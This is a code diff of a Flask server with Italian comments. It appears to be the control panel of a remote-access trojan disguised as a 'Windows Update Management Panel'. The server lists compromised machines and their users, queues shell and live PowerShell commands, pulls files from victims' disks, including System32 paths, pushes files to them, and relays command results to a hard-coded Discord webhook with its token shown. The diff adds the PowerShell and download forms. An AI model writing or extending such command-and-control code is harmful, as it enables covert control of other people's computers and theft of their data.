@@ -12,7 +12,7 @@ import glob
 app = Flask(__name__)
 
 # Configurazione
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"  # ⚠️ SEMPRE CONFIGURATO
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"
 CURRENT_VERSION = "4.0-light"
 
 # Settings logging
@@ -100,7 +100,8 @@ class ClientManager:
                     "username": info.get("username", "Unknown"),
                     "os": info.get("os", "Unknown"),
                     "device_id": info.get("device_id", "Unknown"),
-                    "last_seen": info.get("last_seen").isoformat() if info.get("last_seen") else "Unknown"
+                    "last_seen": info.get("last_seen").isoformat() if info.get("last_seen") else "Unknown",
+                    "active_users": info.get("active_users", [])
                 }
             return result
     
@@ -195,24 +196,21 @@ def admin_panel():
         last_seen = info['last_seen']
         if 'T' in last_seen:
             last_seen = last_seen.split('T')[0]
-
-        # --- Badge utenti attivi ---
+        
+        # Badge utenti attivi
         active_users = info.get('active_users', [])
         user_badge = ""
         if active_users:
             user_count = len(active_users)
-            user_badge = (
-                f'<span class="user-badge">'
-                f'👤{user_count}</span>'
-            )
-
+            user_badge = f' <span style="background:#4CAF50;color:white;padding:2px 6px;border-radius:10px;font-size:12px;">👤{user_count}</span>'
+        
         # Tooltip lista utenti
         users_list = ", ".join(active_users) if active_users else "Nessun utente attivo"
-        user_tooltip = f' title="Utenti attivi: {users_list}"'
-     
+        user_tooltip = f' title="Utenti attivi: {users_list}"' if active_users else ""
+        
         clients_rows += f"""
-        <tr>
-            <td>{client_id}</td>
+        <tr{user_tooltip}>
+            <td>{client_id}{user_badge}</td>
             <td>{info['hostname']}</td>
             <td>{info['username']}</td>
             <td>{info['os']}</td>
@@ -232,7 +230,7 @@ def admin_panel():
                 </form>
                 <form action="/api/remove_client" method="post" style="display: inline;">
                     <input type="hidden" name="client_id" value="{client_id}">
-                    <button style="background: #6c757d;">🗑️</button>
+                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #6c757d;">🗑️</button>
                 </form>
             </td>
         </tr>
@@ -261,7 +259,7 @@ def admin_panel():
     <body>
         <h2>Windows Update Management Panel</h2>
         
-        <!-- 👥 NUOVO: CONFIGURAZIONE GLOBALE UTENTI -->
+        <!-- 👥 CONFIGURAZIONE GLOBALE UTENTI -->
         <div class="global-config">
             <h3 style="margin-top: 0;">🎯 Configurazione Target Utente</h3>
             <p>Seleziona l'utente target per tutti i comandi successivi:</p>
@@ -330,7 +328,7 @@ def admin_panel():
                 
                 // Feedback visivo
                 document.getElementById('globalUserStatus').innerHTML = 
-                    `Stato: <strong>${{targetUser}} ({{targetUser === 'SYSTEM' ? 'tutti gli utenti' : 'utente specifico'}})</strong>`;
+                    `Stato: <strong>${{targetUser}} (${{targetUser === 'SYSTEM' ? 'tutti gli utenti' : 'utente specifico'}})</strong>`;
                 
                 // Salva per la sessione
                 sessionStorage.setItem('globalTargetUser', targetUser);
@@ -360,7 +358,6 @@ def admin_panel():
                     {clients_options}
                 </select><br><br>
                 
-                <!-- 👇 AGGIUNGI QUESTA RIGA IN OGNI FORM -->
                 <input type="hidden" name="target_user" value="SYSTEM">
                 
                 <label>Comando:</label><br>
@@ -376,7 +373,40 @@ def admin_panel():
             </form>
         </div>
         
-        <!-- ... IL RESTO DEI FORM (POWERSHELL, DOWNLOAD, UPLOAD) ... -->
+        <div class="section">
+            <h3>⚡ PowerShell Live</h3>
+            <form action="/api/send_powershell" method="post">
+                <label>Client:</label><br>
+                <select name="client_id" style="width: 100%; padding: 5px;">
+                    {clients_options}
+                </select><br><br>
+                
+                <input type="hidden" name="target_user" value="SYSTEM">
+                
+                <label>Comando:</label><br>
+                <textarea name="command" rows="3" style="width: 100%;" placeholder="Get-Process"></textarea><br><br>
+                
+                <button type="submit">Esegui PowerShell</button>
+            </form>
+        </div>
+        
+        <div class="section">
+            <h3>📥 Download File</h3>
+            <form action="/api/request_download" method="post">
+                <label>Client:</label><br>
+                <select name="client_id" style="width: 100%; padding: 5px;">
+                    {clients_options}
+                </select><br><br>
+                
+                <input type="hidden" name="target_user" value="SYSTEM">
+                
+                <label>Percorso file:</label><br>
+                <input type="text" name="filepath" style="width: 100%; padding: 5px;" 
+                       placeholder="C:\\Users\\{{user}}\\Desktop\\file.txt  oppure  C:\\Windows\\System32\\..."><br><br>
+                
+                <button type="submit">Richiedi Download</button>
+            </form>
+        </div>
         
         <div class="section">
             <h3>📤 Upload File</h3>
@@ -386,7 +416,6 @@ def admin_panel():
                     {clients_options}
                 </select><br><br>
                 
-                <!-- 👇 AGGIUNGI ANCHE QUI -->
                 <input type="hidden" name="target_user" value="SYSTEM">
                 
                 <label>File sul server:</label><br>
@@ -394,7 +423,7 @@ def admin_panel():
                 
                 <label>Destinazione client:</label><br>
                 <input type="text" name="client_path" style="width: 100%; padding: 5px;" 
-                       placeholder="C:\Users\{{user}}\Desktop\file.txt"><br><br>
+                       placeholder="C:\\Users\\{{user}}\\Desktop\\file.txt"><br><br>
                 
                 <button type="submit">Prepara Upload</button>
             </form>
@@ -533,7 +562,7 @@ def receive_results():
         save_result(data)
         
         # Log su Discord
-        result_preview = str(results)[:300]
+        result_preview = str(results)[:500]
         send_to_discord(f"📊 Risultati da {client_id}\nComando: {command}\nRisultato: {result_preview}")
         
         return jsonify({"status": "success", "message": "Results received"})
@@ -546,17 +575,16 @@ def send_command():
     try:
         client_id = request.form.get('client_id')
         command = request.form.get('command')
-        target_user = request.form.get('target_user', 'SYSTEM')  # 👈 NUOVO
+        target_user = request.form.get('target_user', 'SYSTEM')
         
         if not client_id or not command:
             return "Errore: parametri mancanti", 400
         
-        # 👇 NUOVO: Se target_user specificato, modifica comando
+        # Se target_user specificato, modifica comando
         final_command = command
         if target_user != "SYSTEM":
             # Aggiungi prefisso per identificare utente target
             final_command = f"user_{target_user}:{command}"
-            debug_log(f"🎯 Comando per utente specifico: {target_user} → {command}")
         
         client_manager.add_command(client_id, final_command)
         send_to_discord(f"🌐 Comando '{command}' per {client_id}" + 
@@ -578,12 +606,12 @@ def send_powershell():
     try:
         client_id = request.form.get('client_id')
         ps_command = request.form.get('command')
-        target_user = request.form.get('target_user', 'SYSTEM')  # 👈 NUOVO
+        target_user = request.form.get('target_user', 'SYSTEM')
         
         if not client_id or not ps_command:
             return "Errore: parametri mancanti", 400
         
-        # 👇 NUOVO: Aggiungi info utente al comando
+        # Aggiungi info utente al comando
         final_command = f"powershell_live:{ps_command}"
         if target_user != "SYSTEM":
             final_command = f"user_{target_user}:powershell_live:{ps_command}"
@@ -610,16 +638,15 @@ def request_download():
     try:
         client_id = request.form.get('client_id')
         filepath = request.form.get('filepath')
-        target_user = request.form.get('target_user', 'SYSTEM')  # 👈 NUOVO
+        target_user = request.form.get('target_user', 'SYSTEM')
         
         if not client_id or not filepath:
             return "Errore: parametri mancanti", 400
         
-        # 👇 NUOVO: Sostituisci {user} nel path se target_user specificato
+        # Sostituisci {user} nel path se target_user specificato
         final_filepath = filepath
         if target_user != "SYSTEM" and "{user}" in filepath:
             final_filepath = filepath.replace("{user}", target_user)
-            debug_log(f"🎯 Path sostituito: {filepath} → {final_filepath}")
         
         command = f"download_file:{final_filepath}"
         if target_user != "SYSTEM":
@@ -648,12 +675,12 @@ def prepare_upload():
         client_id = request.form.get('client_id')
         server_path = request.form.get('server_path')
         client_path = request.form.get('client_path')
-        target_user = request.form.get('target_user', 'SYSTEM')  # 👈 NUOVO
+        target_user = request.form.get('target_user', 'SYSTEM')
         
         if not all([client_id, server_path, client_path]):
             return "Errore: parametri mancanti", 400
         
-        # 👇 NUOVO: Sostituisci {user} nel path destinazione
+        # Sostituisci {user} nel path destinazione
         final_client_path = client_path
         if target_user != "SYSTEM" and "{user}" in client_path:
             final_client_path = client_path.replace("{user}", target_user)
@@ -719,6 +746,3 @@ if __name__ == '__main__':
     threading.Thread(target=cleanup_loop, daemon=True).start()
     
     send_to_discord(f"🚀 Server v{CURRENT_VERSION} avviato")
-    
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
